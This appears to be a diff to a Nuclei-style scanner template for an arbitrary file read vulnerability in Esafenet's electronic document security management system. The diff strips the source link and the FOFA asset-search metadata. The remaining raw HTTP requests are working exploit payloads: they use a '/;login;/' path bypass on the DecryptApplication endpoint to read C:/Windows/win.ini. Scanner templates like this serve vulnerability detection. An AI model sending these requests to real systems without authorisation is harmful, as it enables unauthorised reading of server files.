@@ -3,12 +3,8 @@ info:
   name: 亿赛通-电子文档安全管理系统DecryptApplication接口存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vdgypcza1dev77k9'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: vdgypcza1dev77k9
-    fofa: app="亿赛通-电子文档安全管理系统"||body="/CDGServer3/index.jsp"
 http:
 - raw:
   - 'GET /CDGServer3/client/;login;/DecryptApplication?command=ViewUploadFile&filePath=C://Windows/win.ini&uploadFileId=1&fileName1=1 HTTP/1.1
@@ -28,8 +24,6 @@ http:
 
 
     Content-Type: application/x-www-form-urlencoded
-
-
 
 
     command=ViewUploadFile&filePath=C:/Windows/win.ini&fileNamel=l.png&uploadFileId=1
